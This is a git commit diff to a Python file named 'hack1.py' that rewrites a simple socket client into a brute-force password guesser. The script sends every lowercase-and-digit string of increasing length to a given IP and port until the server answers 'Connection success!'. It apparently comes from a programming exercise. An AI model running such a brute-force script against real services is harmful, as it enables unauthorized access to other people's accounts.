90804964a752e97d2a66b0957afcb55db357fc04
Konstantin Lapitanov <89107827+Konstannttiinn1@users.noreply.github.com>
2022-07-15 14:12:27 +0300

    Update hack1.py

--- hack1.py
+++ hack1.py
@@ -1,15 +1,41 @@
 import socket
-from sys import argv
+import argparse
+from itertools import product
+from string import ascii_lowercase, digits
 
-with socket.socket() as socket:
-    address = argv[1]
-    port = int(argv[2])
-    message = argv[3].encode()
 
-    sock = (address, port)
+def main():
+    with socket.socket() as client_sock:
+        address = (args.ip_address, args.port)
 
-    socket.connect(sock)
+        client_sock.connect(address)
 
-    socket.send(message)
-    recieve = socket.recv(1024).decode()
-    print(recieve)
+        characters = "".join(ascii_lowercase + digits)
+
+        length = 1
+        while True:
+            password_set = product(characters, repeat=length)
+            send_receive(client_sock, password_set)
+            length += 1
+
+
+def send_receive(client, password_set):
+    for password in password_set:
+        client.send("".join(password).encode())
+
+        response = client.recv(1024)
+
+        response = response.decode()
+
+        if response == "Connection success!":
+            print("".join(password))
+            exit(0)
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument('ip_address', type=str, help='IP address')
+    parser.add_argument('port', type=int, help='port number')
+    args = parser.parse_args()
+
+    main()
